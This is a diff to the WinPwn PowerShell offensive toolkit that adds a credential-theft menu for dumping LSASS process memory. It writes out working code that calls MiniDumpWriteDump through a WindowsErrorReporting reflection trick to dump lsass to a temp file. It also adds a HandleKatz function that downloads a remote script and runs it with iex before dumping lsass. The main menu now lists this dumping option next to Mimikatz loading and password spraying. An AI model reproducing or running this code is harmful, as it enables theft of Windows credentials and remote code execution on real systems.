@@ -642,6 +642,82 @@ __        ___       ____
         }
         While ($masterquestion -ne 12)
 }
+
+
+function lsassdumps
+{
+        do
+        {
+       @'
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+   --> Dump lsass for sweet creds
+'@
+            Write-Host "================ WinPwn ================"
+            Write-Host -ForegroundColor Green '1. Use HandleKatz! '
+            Write-Host -ForegroundColor Green '2. Use WerDump! '
+            Write-Host -ForegroundColor Green '3. Dump lsass using rundll32 technique!'
+            Write-Host -ForegroundColor Green '4. Go back '
+            Write-Host "================ WinPwn ================"
+            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+            
+            Switch ($masterquestion) 
+            {
+                1{if(isadmin){HandleKatz}}
+                2{if(isadmin){werDump}}
+                3{if(isadmin){Dumplsass}}
+             }
+        }
+        While ($masterquestion -ne 4)
+
+}
+
+function werDump
+{
+  <#
+        .DESCRIPTION
+        Dump lsass via wer, credit goes to https://twitter.com/JohnLaTwC/status/1411345380407578624
+        Author: @S3cur3Th1sSh1t
+    #>
+    Write-Host "Dumping to C:\windows\temp\dump.txt"
+    $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic');$Flags = [Reflection.BindingFlags] 'NonPublic, Static';$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags);$ProcessDumpPath = 'C:\windows\temp\dump.txt';$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create);$p=Get-Process lsass;$Result = $MiniDumpWriteDump.Invoke($null, @($p.Handle,$p.Id,$FileStream.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));$FileStream.Close()
+    if (test-Path "C:\windows\temp\dump.txt")
+    {
+        Write-Host "Lsass dump success: " $Result
+    }
+
+}
+
+function HandleKatz
+{
+  <#
+        .DESCRIPTION
+        Dump lsass, credit goes to https://github.com/codewhitesec/HandleKatz, @thefLinkk
+        Author: @S3cur3Th1sSh1t
+    #>
+     param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput
+        )
+    if(!$consoleoutput){pathcheck}
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if (isadmin)
+    {
+      $processes = Get-Process
+      $dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass"){$process.id}}
+      
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Handlekatz.ps1')
+      Invoke-HandleKatz -handProcID $dumpid
+    }
+    else{Write-Host "No Admin rights, start again using a privileged session!"}
+}
+
 function Decryptteamviewer
 {
   param(
@@ -4394,7 +4470,8 @@ __        ___       ____
       Write-Host -ForegroundColor Green '14. Load custom C# Binaries from a webserver to Memory and execute them!'
       Write-Host -ForegroundColor Green '15. DomainPasswordSpray Attacks!'
       Write-Host -ForegroundColor Green '16. Reflectively load Mimik@tz into memory!'
-        Write-Host -ForegroundColor Green '17. Exit. '
+      Write-Host -ForegroundColor Green '17. Dump lsass via various techniques!'
+        Write-Host -ForegroundColor Green '18. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -4416,6 +4493,7 @@ __        ___       ____
           14{sharpcradle -web}
             15{domainpassspray}
           16{mimiload}
+          17{lsassdumps}
         
     }
     }
